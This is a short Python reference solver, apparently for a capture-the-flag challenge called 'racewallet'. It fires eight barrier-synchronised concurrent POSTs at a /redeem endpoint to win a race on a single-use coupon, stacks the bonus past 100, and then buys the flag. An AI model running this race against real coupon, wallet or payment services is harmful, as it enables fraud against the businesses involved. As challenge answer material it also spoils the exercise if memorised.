"""Reference solver for racewallet: race the single-use coupon, then buy.

    python3 solve.py <host> <port>

Fires a burst of concurrent /redeem requests so several clear the "already used?"
check before any marks the coupon spent, stacking the +40 bonus past 100, then
buys the flag.
"""
import json
import sys
import threading
import urllib.request


def post(base, path):
    req = urllib.request.Request(base + path, data=b"", method="POST")
    try:
        return json.loads(urllib.request.urlopen(req, timeout=10).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"
    # Enough concurrency to win the race with margin; each success adds 40.
    barrier = threading.Barrier(8)
    results = []

    def worker():
        barrier.wait()                       # release all requests at once
        results.append(post(base, "/redeem"))

    threads = [threading.Thread(target=worker) for _ in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    bal = json.loads(urllib.request.urlopen(base + "/balance", timeout=10).read())
    print("balance after race:", bal.get("balance"))
    out = post(base, "/buy")
    print(out.get("flag") or out)


if __name__ == "__main__":
    main()
